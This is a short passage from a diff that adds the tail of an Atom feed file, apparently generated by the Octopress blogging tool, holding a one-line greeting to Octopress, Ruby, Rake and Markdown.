+    <content type="html"><![CDATA[<blockquote><p>Hello octopress, ruby, rake, markdown, blogging !</p></blockquote>
+]]></content>
+  </entry>
+  
+</feed>
